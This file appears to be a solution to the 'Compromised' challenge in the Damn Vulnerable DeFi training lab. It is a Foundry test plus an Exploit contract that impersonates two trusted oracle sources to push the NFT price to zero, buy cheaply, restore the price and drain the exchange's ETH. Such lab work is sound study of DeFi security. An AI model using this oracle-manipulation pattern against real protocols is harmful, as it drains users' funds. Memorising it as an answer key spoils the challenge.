// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * The challenge involves an exchange that sells NFTs called “DVNFT” whose price is determined by an on‐chain oracle. 
     * The oracle aggregates price data from three trusted sources and uses the median value. 
     * The intended assumption is that at least two of the three sources are honest. 
     * However, if an attacker compromises two trusted sources, they can arbitrarily control the NFT’s price.
     * By making two sources report a very low price (e.g., 0), the median price will become very low, regardless of what the third honest source reports.
     * 
     * By manipulating the oracle price, an attacker can:
     * Buy NFTs cheaply: Reduce the price to near zero, buy NFTs from the exchange for almost nothing.
     * Sell NFTs expensively: Increase the price to a very high value, sell the cheaply acquired NFTs back to the exchange for a huge profit (draining the exchange's ETH reserves).
     */
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value: address(this).balance}(oracle, exchange, nft, recovery);

        // Phase 1: Lower the price by compromising sources 0 and 1
        vm.startPrank(sources[0]); // Start impersonating source[0]
        oracle.postPrice(symbols[0], 0); // Source[0] reports price 0
        vm.stopPrank(); // Stop impersonating source[0]

        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0], 0);
        vm.stopPrank();

        exploit.buy(); // Player buys an NFT at the manipulated low price

        // Phase 2: Restore the price and sell for profit
        vm.startPrank(sources[0]); // Start impersonating source[0] again
        oracle.postPrice(symbols[0], 999 ether); // Source[0] reports original high price
        vm.stopPrank(); // Stop impersonating source[0]

        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0], 999 ether);
        vm.stopPrank();

        exploit.sell(); // Player sells the NFT back to the exchange at the high price
        exploit.recover(999 ether); // Transfers the drained ETH to the recovery address
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

contract Exploit is IERC721Receiver {
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint256 nftId;
    address recovery;

    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable {
        // Send minimal ETH to buy (price should be near 0)
        uint256 _nftId = exchange.buyOne{value: 1}();
        nftId = _nftId;
    }
    

    function sell() external payable {
        // Approve Exchange to transfer the NFT
        nft.approve(address(exchange), nftId);
        // Sell the NFT back to the Exchange
        exchange.sellOne(nftId);
    }

    function recover(uint256 amount) external {
        payable(recovery).transfer(amount);
    }

    // Standard ERC721 receiver implementation
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }

    // Payable receive function for contract to receive ETH
    receive() external payable {}
}
